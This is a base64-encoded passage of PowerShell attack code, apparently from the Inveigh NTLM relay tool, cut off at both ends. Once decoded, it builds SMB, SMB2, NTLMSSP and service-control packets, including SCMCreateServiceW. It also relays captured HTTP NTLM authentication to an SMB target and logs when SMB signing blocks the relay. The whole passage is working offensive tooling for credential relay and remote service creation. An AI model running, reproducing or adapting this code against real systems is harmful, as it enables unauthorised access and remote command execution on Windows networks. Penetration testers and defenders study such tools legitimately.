KSkKICAgICAgICAkcGFja2V0X1NDTUNyZWF0ZVNlcnZpY2VXLkFkZCgiU0NNQ3JlYXRlU2VydmljZVdfQmluYXJ5UGF0aE5hbWVfTWF4Q291bnQiLCRwYWNrZXRfY29tbWFuZF9sZW5ndGgpCiAgICAgICAgJHBhY2tldF9TQ01DcmVhdGVTZXJ2aWNlVy5BZGQoIlNDTUNyZWF0ZVNlcnZpY2VXX0JpbmFyeVBhdGhOYW1lX09mZnNldCIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpCiAgICAgICAgJHBhY2tldF9TQ01DcmVhdGVTZXJ2aWNlVy5BZGQoIlNDTUNyZWF0ZVNlcnZpY2VXX0JpbmFyeVBhdGhOYW1lX0FjdHVhbENvdW50IiwkcGFja2V0X2NvbW1hbmRfbGVuZ3RoKQogICAgICAgICRwYWNrZXRfU0NNQ3JlYXRlU2VydmljZVcuQWRkKCJTQ01DcmVhdGVTZXJ2aWNlV19CaW5hcnlQYXRoTmFtZSIsJHBhY2tldF9jb21tYW5kKQogICAgICAgICRwYWNrZXRfU0NNQ3JlYXRlU2VydmljZVcuQWRkKCJTQ01DcmVhdGVTZXJ2aWNlV19OVUxMUG9pbnRlciIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpCiAgICAgICAgJHBhY2tldF9TQ01DcmVhdGVTZXJ2aWNlVy5BZGQoIlNDTUNyZWF0ZVNlcnZpY2VXX1RhZ0lEIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwKSkKICAgICAgICAkcGFja2V0X1NDTUNyZWF0ZVNlcnZpY2VXLkFkZCgiU0NNQ3JlYXRlU2VydmljZVdfTlVMTFBvaW50ZXIyIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwKSkKICAgICAgICAkcGFja2V0X1NDTUNyZWF0ZVNlcnZpY2VXLkFkZCgiU0NNQ3JlYXRlU2VydmljZVdfRGVwZW5kU2l6ZSIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpCiAgICAgICAgJHBhY2tldF9TQ01DcmVhdGVTZXJ2aWNlVy5BZGQoIlNDTUNyZWF0ZVNlcnZpY2VXX05VTExQb2ludGVyMyIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpCiAgICAgICAgJHBhY2tldF9TQ01DcmVhdGVTZXJ2aWNlVy5BZGQoIlNDTUNyZWF0ZVNlcnZpY2VXX05VTExQb2ludGVyNCIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpCiAgICAgICAgJHBhY2tldF9TQ01DcmVhdGVTZXJ2aWNlVy5BZGQoIlNDTUNyZWF0ZVNlcnZpY2VXX1Bhc3N3b3JkU2l6ZSIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpCgogICAgICAgIHJldHVybiAkcGFja2V0X1NDTUNyZWF0ZVNlcnZpY2VXCiAgICB9CgogICAgZnVuY3Rpb24gR2V0LVBhY2tldFNDTVN0YXJ0U2VydmljZVcoKQogICAgewogICAgICAgIHBhcmFtKFtCeXRlW11dJHBhY2tldF9jb250ZXh0X2hhbmRsZSkKCiAgICAgICAgJHBhY2tldF9TQ01TdGFydFNlcnZpY2VXID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuU3BlY2lhbGl6ZWQuT3JkZXJlZERpY3Rpb25hcnkKICAgICAgICAkcGFja2V0X1NDTVN0YXJ0U2VydmljZVcuQWRkKCJTQ01TdGFydFNlcnZpY2VXX0NvbnRleHRIYW5kbGUiLCRwYWNrZXRfY29udGV4dF9oYW5kbGUpCiAgICAgICAgJHBhY2tldF9TQ01TdGFydFNlcnZpY2VXLkFkZCgiU0NNU3RhcnRTZXJ2aWNlV19Vbmtub3duIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDApKQoKICAgICAgICByZXR1cm4gJHBhY2tldF9TQ01TdGFydFNlcnZpY2VXCiAgICB9CgogICAgZnVuY3Rpb24gR2V0LVBhY2tldFNDTURlbGV0ZVNlcnZpY2VXKCkKICAgIHsKICAgICAgICBwYXJhbShbQnl0ZVtdXSRwYWNrZXRfY29udGV4dF9oYW5kbGUpCgogICAgICAgICRwYWNrZXRfU0NNRGVsZXRlU2VydmljZVcgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5TcGVjaWFsaXplZC5PcmRlcmVkRGljdGlvbmFyeQogICAgICAgICRwYWNrZXRfU0NNRGVsZXRlU2VydmljZVcuQWRkKCJTQ01EZWxldGVTZXJ2aWNlV19Db250ZXh0SGFuZGxlIiwkcGFja2V0X2NvbnRleHRfaGFuZGxlKQoKICAgICAgICByZXR1cm4gJHBhY2tldF9TQ01EZWxldGVTZXJ2aWNlVwogICAgfQoKICAgIGZ1bmN0aW9uIEdldC1QYWNrZXRTQ01DbG9zZVNlcnZpY2VIYW5kbGUoKQogICAgewogICAgICAgIHBhcmFtKFtCeXRlW11dJHBhY2tldF9jb250ZXh0X2hhbmRsZSkKCiAgICAgICAgJHBhY2tldF9TQ01fQ2xvc2VTZXJ2aWNlVyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkLk9yZGVyZWREaWN0aW9uYXJ5CiAgICAgICAgJHBhY2tldF9TQ01fQ2xvc2VTZXJ2aWNlVy5BZGQoIlNDTUNsb3NlU2VydmljZVdfQ29udGV4dEhhbmRsZSIsJHBhY2tldF9jb250ZXh0X2hhbmRsZSkKCiAgICAgICAgcmV0dXJuICRwYWNrZXRfU0NNX0Nsb3NlU2VydmljZVcKICAgIH0KCn0KCiMgU01CIE5UTE0gRnVuY3Rpb25zIFNjcmlwdEJsb2NrIC0gZnVuY3Rpb24gZm9yIHBhcnNpbmcgTlRMTSBjaGFsbGVuZ2UKJFNNQl9OVExNX2Z1bmN0aW9uc19zY3JpcHRibG9jayA9CnsKICAgIGZ1bmN0aW9uIFNNQk5UTE1DaGFsbGVuZ2UKICAgIHsKICAgICAgICBwYXJhbSAoW0J5dGVbXV0kcGF5bG9hZF9ieXRlcykKCiAgICAgICAgJHBheWxvYWQgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRwYXlsb2FkX2J5dGVzKQogICAgICAgICRwYXlsb2FkID0gJHBheWxvYWQgLXJlcGxhY2UgIi0iLCIiCiAgICAgICAgJE5UTE1faW5kZXggPSAkcGF5bG9hZC5JbmRleE9mKCI0RTU0NEM0RDUzNTM1MDAwIikKCiAgICAgICAgaWYoJHBheWxvYWQuU3ViU3RyaW5nKCgkTlRMTV9pbmRleCArIDE2KSw4KSAtZXEgIjAyMDAwMDAwIikKICAgICAgICB7CiAgICAgICAgICAgICROVExNX2NoYWxsZW5nZSA9ICRwYXlsb2FkLlN1YlN0cmluZygoJE5UTE1faW5kZXggKyA0OCksMTYpCiAgICAgICAgfQoKICAgICAgICByZXR1cm4gJE5UTE1fY2hhbGxlbmdlCiAgICB9Cgp9CgojIFNNQiBSZWxheSBDaGFsbGVuZ2UgU2NyaXB0QmxvY2sgLSBnYXRoZXJzIE5UTE0gc2VydmVyIGNoYWxsZW5nZSBmcm9tIHJlbGF5IHRhcmdldAokU01CX3JlbGF5X2NoYWxsZW5nZV9zY3JpcHRibG9jayA9CnsKICAgIGZ1bmN0aW9uIFNNQlJlbGF5Q2hhbGxlbmdlCiAgICB7CiAgICAgICAgcGFyYW0gKCRTTUJfcmVsYXlfc29ja2V0LCRIVFRQX3JlcXVlc3RfYnl0ZXMsJFNNQl92ZXJzaW9uKQoKICAgICAgICBpZigkU01CX3JlbGF5X3NvY2tldCkKICAgICAgICB7CiAgICAgICAgICAgICRTTUJfcmVsYXlfY2hhbGxlbmdlX3N0cmVhbSA9ICRTTUJfcmVsYXlfc29ja2V0LkdldFN0cmVhbSgpCiAgICAgICAgfQogICAgICAgIAogICAgICAgICRTTUJfY2xpZW50X3JlY2VpdmUgPSBOZXctT2JqZWN0IFN5c3RlbS5CeXRlW10gMTAyNAogICAgICAgICRTTUJfY2xpZW50X3N0YWdlID0gJ05lZ290aWF0ZVNNQicKICAgICAgICAKICAgICAgICA6U01CX3JlbGF5X2NoYWxsZW5nZV9sb29wIHdoaWxlKCRTTUJfY2xpZW50X3N0YWdlIC1uZSAnZXhpdCcpCiAgICAgICAgewogICAgICAgIAogICAgICAgICAgICBzd2l0Y2ggKCRTTUJfY2xpZW50X3N0YWdlKQogICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgJ05lZ290aWF0ZVNNQicKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQl9oZWFkZXIgPSBHZXQtUGFja2V0U01CSGVhZGVyIDB4NzIgMHgxOCAweDAxLDB4NDggMHhmZiwweGZmICRpbnZlaWdoLnByb2Nlc3NfSURfYnl0ZXMgMHgwMCwweDAwICAgICAgIAogICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CX2RhdGEgPSBHZXQtUGFja2V0U01CTmVnb3RpYXRlUHJvdG9jb2xSZXF1ZXN0ICRTTUJfdmVyc2lvbgogICAgICAgICAgICAgICAgICAgICRTTUJfaGVhZGVyID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUJfaGVhZGVyCiAgICAgICAgICAgICAgICAgICAgJFNNQl9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUJfZGF0YQogICAgICAgICAgICAgICAgICAgICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBHZXQtUGFja2V0TmV0QklPU1Nlc3Npb25TZXJ2aWNlICRTTUJfaGVhZGVyLkxlbmd0aCAkU01CX2RhdGEuTGVuZ3RoCiAgICAgICAgICAgICAgICAgICAgJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZQogICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3NlbmQgPSAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgKyAkU01CX2hlYWRlciArICRTTUJfZGF0YQogICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfY2hhbGxlbmdlX3N0cmVhbS5Xcml0ZSgkU01CX2NsaWVudF9zZW5kLDAsJFNNQl9jbGllbnRfc2VuZC5MZW5ndGgpID4gJG51bGwKICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X2NoYWxsZW5nZV9zdHJlYW0uRmx1c2goKSAgICAKICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X2NoYWxsZW5nZV9zdHJlYW0uUmVhZCgkU01CX2NsaWVudF9yZWNlaXZlLDAsJFNNQl9jbGllbnRfcmVjZWl2ZS5MZW5ndGgpID4gJG51bGwKCiAgICAgICAgICAgICAgICAgICAgaWYoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkU01CX2NsaWVudF9yZWNlaXZlWzQuLjddKSAtZXEgJ2ZmLTUzLTRkLTQyJykKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfdmVyc2lvbiA9ICdTTUIxJwogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdGFnZSA9ICdOVExNU1NQTmVnb3RpYXRlJwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdGFnZSA9ICdOZWdvdGlhdGVTTUIyJwogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgaWYoKCRTTUJfdmVyc2lvbiAtZXEgJ1NNQjEnIC1hbmQgW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkU01CX2NsaWVudF9yZWNlaXZlWzM5XSkgLWVxICcwZicpIC1vciAoJFNNQl92ZXJzaW9uIC1uZSAnU01CMScgLWFuZCBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRTTUJfY2xpZW50X3JlY2VpdmVbNzBdKSAtZXEgJzAzJykpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiU01CIHJlbGF5IGRpc2FibGVkIGR1ZSB0byBTTUIgc2lnbmluZyByZXF1aXJlbWVudCBvbiAkVGFyZ2V0IikKICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9zb2NrZXQuQ2xvc2UoKQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9yZWNlaXZlID0gJG51bGwKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guU01CX3JlbGF5ID0gJGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlID0gJ2V4aXQnCgogICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5maWxlX291dHB1dCkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIFNNQiByZWxheSBkaXNhYmxlZCBkdWUgdG8gU01CIHNpZ25pbmcgcmVxdWlyZW1lbnQgb24gJFRhcmdldCIpCiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmxvZ19vdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gU01CIHJlbGF5IGRpc2FibGVkIGR1ZSB0byBTTUIgc2lnbmluZyByZXF1aXJlbWVudCBvbiAkVGFyZ2V0IikKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAnTmVnb3RpYXRlU01CMicKICAgICAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICAgICAgJFNNQjJfdHJlZV9JRCA9IDB4MDAsMHgwMCwweDAwLDB4MDAKICAgICAgICAgICAgICAgICAgICAkU01CX3Nlc3Npb25fSUQgPSAweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAKICAgICAgICAgICAgICAgICAgICAkU01CMl9tZXNzYWdlX0lEID0gMQogICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9oZWFkZXIgPSBHZXQtUGFja2V0U01CMkhlYWRlciAweDAwLDB4MDAgJFNNQjJfbWVzc2FnZV9JRCAkU01CMl90cmVlX0lEICRTTUJfc2Vzc2lvbl9JRCAgCiAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2RhdGEgPSBHZXQtUGFja2V0U01CMk5lZ290aWF0ZVByb3RvY29sUmVxdWVzdAogICAgICAgICAgICAgICAgICAgICRTTUIyX2hlYWRlciA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CMl9oZWFkZXIKICAgICAgICAgICAgICAgICAgICAkU01CMl9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUIyX2RhdGEKICAgICAgICAgICAgICAgICAgICAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gR2V0LVBhY2tldE5ldEJJT1NTZXNzaW9uU2VydmljZSAkU01CMl9oZWFkZXIuTGVuZ3RoICRTTUIyX2RhdGEuTGVuZ3RoCiAgICAgICAgICAgICAgICAgICAgJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZQogICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3NlbmQgPSAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgKyAkU01CMl9oZWFkZXIgKyAkU01CMl9kYXRhCiAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9jaGFsbGVuZ2Vfc3RyZWFtLldyaXRlKCRTTUJfY2xpZW50X3NlbmQsMCwkU01CX2NsaWVudF9zZW5kLkxlbmd0aCkgPiAkbnVsbAogICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfY2hhbGxlbmdlX3N0cmVhbS5GbHVzaCgpICAgIAogICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfY2hhbGxlbmdlX3N0cmVhbS5SZWFkKCRTTUJfY2xpZW50X3JlY2VpdmUsMCwkU01CX2NsaWVudF9yZWNlaXZlLkxlbmd0aCkgPiAkbnVsbAogICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlID0gJ05UTE1TU1BOZWdvdGlhdGUnCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgJ05UTE1TU1BOZWdvdGlhdGUnCiAgICAgICAgICAgICAgICB7IAogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmKCRTTUJfdmVyc2lvbiAtZXEgJ1NNQjEnKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUJfaGVhZGVyID0gR2V0LVBhY2tldFNNQkhlYWRlciAweDczIDB4MTggMHgwMSwweDQ4IDB4ZmYsMHhmZiAkaW52ZWlnaC5wcm9jZXNzX0lEX2J5dGVzIDB4MDAsMHgwMAogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X05UTE1TU1BfbmVnb3RpYXRlID0gR2V0LVBhY2tldE5UTE1TU1BOZWdvdGlhdGUgMHgwNywweDgyLDB4MDgsMHhhMiAkSFRUUF9yZXF1ZXN0X2J5dGVzWygkSFRUUF9yZXF1ZXN0X2J5dGVzLkxlbmd0aC04KS4uKCRIVFRQX3JlcXVlc3RfYnl0ZXMuTGVuZ3RoKV0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9oZWFkZXIgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQl9oZWFkZXIKICAgICAgICAgICAgICAgICAgICAgICAgJE5UTE1TU1BfbmVnb3RpYXRlID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9OVExNU1NQX25lZ290aWF0ZSAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUJfZGF0YSA9IEdldC1QYWNrZXRTTUJTZXNzaW9uU2V0dXBBbmRYUmVxdWVzdCAkTlRMTVNTUF9uZWdvdGlhdGUKICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUJfZGF0YQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gR2V0LVBhY2tldE5ldEJJT1NTZXNzaW9uU2VydmljZSAkU01CX2hlYWRlci5MZW5ndGggJFNNQl9kYXRhLkxlbmd0aAogICAgICAgICAgICAgICAgICAgICAgICAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3NlbmQgPSAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgKyAkU01CX2hlYWRlciArICRTTUJfZGF0YQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9tZXNzYWdlX0lEICs9IDEKICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2hlYWRlciA9IEdldC1QYWNrZXRTTUIySGVhZGVyIDB4MDEsMHgwMCAkU01CMl9tZXNzYWdlX0lEICRTTUIyX3RyZWVfSUQgJFNNQl9zZXNzaW9uX0lECiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfTlRMTVNTUF9uZWdvdGlhdGUgPSBHZXQtUGFja2V0TlRMTVNTUE5lZ290aWF0ZSAweDA3LDB4ODIsMHgwOCwweGEyICRIVFRQX3JlcXVlc3RfYnl0ZXNbKCRIVFRQX3JlcXVlc3RfYnl0ZXMuTGVuZ3RoLTgpLi4oJEhUVFBfcmVxdWVzdF9ieXRlcy5MZW5ndGgpXQogICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9oZWFkZXIgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQjJfaGVhZGVyCiAgICAgICAgICAgICAgICAgICAgICAgICROVExNU1NQX25lZ290aWF0ZSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfTlRMTVNTUF9uZWdvdGlhdGUgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9kYXRhID0gR2V0LVBhY2tldFNNQjJTZXNzaW9uU2V0dXBSZXF1ZXN0ICROVExNU1NQX25lZ290aWF0ZQogICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUIyX2RhdGEKICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IEdldC1QYWNrZXROZXRCSU9TU2Vzc2lvblNlcnZpY2UgJFNNQjJfaGVhZGVyLkxlbmd0aCAkU01CMl9kYXRhLkxlbmd0aAogICAgICAgICAgICAgICAgICAgICAgICAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3NlbmQgPSAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgKyAkU01CMl9oZWFkZXIgKyAkU01CMl9kYXRhCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X2NoYWxsZW5nZV9zdHJlYW0uV3JpdGUoJFNNQl9jbGllbnRfc2VuZCwwLCRTTUJfY2xpZW50X3NlbmQuTGVuZ3RoKSA+ICRudWxsCiAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9jaGFsbGVuZ2Vfc3RyZWFtLkZsdXNoKCkgICAgCiAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9jaGFsbGVuZ2Vfc3RyZWFtLlJlYWQoJFNNQl9jbGllbnRfcmVjZWl2ZSwwLCRTTUJfY2xpZW50X3JlY2VpdmUuTGVuZ3RoKSA+ICRudWxsCiAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RhZ2UgPSAnZXhpdCcKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIH0KCiAgICAgICAgfQoKICAgICAgICByZXR1cm4gJFNNQl9jbGllbnRfcmVjZWl2ZQogICAgfQoKfQoKIyBTTUIgUmVsYXkgUmVzcG9uc2UgU2NyaXB0QmxvY2sgLSBzZW5kcyBOVExNIHJlcG9uc2UgdG8gcmVsYXkgdGFyZ2V0CiRTTUJfcmVsYXlfcmVzcG9uc2Vfc2NyaXB0YmxvY2sgPQp7CiAgICBmdW5jdGlvbiBTTUJSZWxheVJlc3BvbnNlCiAgICB7CiAgICAgICAgcGFyYW0gKCRTTUJfcmVsYXlfc29ja2V0LCRIVFRQX3JlcXVlc3RfYnl0ZXMsJFNNQl92ZXJzaW9uLCRTTUJfdXNlcl9JRCwkU01CX3Nlc3Npb25fSUQpCiAgICAKICAgICAgICAkU01CX2NsaWVudF9yZWNlaXZlID0gTmV3LU9iamVjdCBTeXN0ZW0uQnl0ZVtdIDEwMjQKCiAgICAgICAgaWYoJFNNQl9yZWxheV9zb2NrZXQpCiAgICAgICAgewogICAgICAgICAgICAkU01CX3JlbGF5X3Jlc3BvbnNlX3N0cmVhbSA9ICRTTUJfcmVsYXlfc29ja2V0LkdldFN0cmVhbSgpCiAgICAgICAgfQoKICAgICAgICBpZigkU01CX3ZlcnNpb24gLWVxICdTTUIxJykKICAgICAgICB7CiAgICAgICAgICAgICRwYWNrZXRfU01CX2hlYWRlciA9IEdldC1QYWNrZXRTTUJIZWFkZXIgMHg3MyAweDE4IDB4MDEsMHg0OCAweGZmLDB4ZmYgJGludmVpZ2gucHJvY2Vzc19JRF9ieXRlcyAkU01CX3VzZXJfSUQKICAgICAgICAgICAgJHBhY2tldF9TTUJfaGVhZGVyWyJTTUJIZWFkZXJfVXNlcklEIl0gPSAkU01CX3VzZXJfSUQKICAgICAgICAgICAgJHBhY2tldF9OVExNU1NQX2F1dGggPSBHZXQtUGFja2V0TlRMTVNTUEF1dGggJEhUVFBfcmVxdWVzdF9ieXRlcwogICAgICAgICAgICAkU01CX2hlYWRlciA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CX2hlYWRlcgogICAgICAgICAgICAkTlRMTVNTUF9hdXRoID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9OVExNU1NQX2F1dGggICAgICAKICAgICAgICAgICAgJHBhY2tldF9TTUJfZGF0YSA9IEdldC1QYWNrZXRTTUJTZXNzaW9uU2V0dXBBbmRYUmVxdWVzdCAkTlRMTVNTUF9hdXRoCiAgICAgICAgICAgICRTTUJfZGF0YSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CX2RhdGEKICAgICAgICAgICAgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IEdldC1QYWNrZXROZXRCSU9TU2Vzc2lvblNlcnZpY2UgJFNNQl9oZWFkZXIuTGVuZ3RoICRTTUJfZGF0YS5MZW5ndGgKICAgICAgICAgICAgJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZQogICAgICAgICAgICAkU01CX2NsaWVudF9zZW5kID0gJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlICsgJFNNQl9oZWFkZXIgKyAkU01CX2RhdGEKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgJFNNQjJfbWVzc2FnZV9JRCA9IDMKICAgICAgICAgICAgJFNNQjJfdHJlZV9JRCA9IDB4MDAsMHgwMCwweDAwLDB4MDAKICAgICAgICAgICAgJHBhY2tldF9TTUIyX2hlYWRlciA9IEdldC1QYWNrZXRTTUIySGVhZGVyIDB4MDEsMHgwMCAkU01CMl9tZXNzYWdlX0lEICRTTUIyX3RyZWVfSUQgJFNNQl9zZXNzaW9uX0lECiAgICAgICAgICAgICRwYWNrZXRfTlRMTVNTUF9hdXRoID0gR2V0LVBhY2tldE5UTE1TU1BBdXRoICRIVFRQX3JlcXVlc3RfYnl0ZXMKICAgICAgICAgICAgJFNNQjJfaGVhZGVyID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUIyX2hlYWRlcgogICAgICAgICAgICAkTlRMTVNTUF9hdXRoID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9OVExNU1NQX2F1dGggICAgICAgIAogICAgICAgICAgICAkcGFja2V0X1NNQjJfZGF0YSA9IEdldC1QYWNrZXRTTUIyU2Vzc2lvblNldHVwUmVxdWVzdCAkTlRMTVNTUF9hdXRoCiAgICAgICAgICAgICRTTUIyX2RhdGEgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQjJfZGF0YQogICAgICAgICAgICAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gR2V0LVBhY2tldE5ldEJJT1NTZXNzaW9uU2VydmljZSAkU01CMl9oZWFkZXIuTGVuZ3RoICRTTUIyX2RhdGEuTGVuZ3RoCiAgICAgICAgICAgICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfTmV0QklPU19z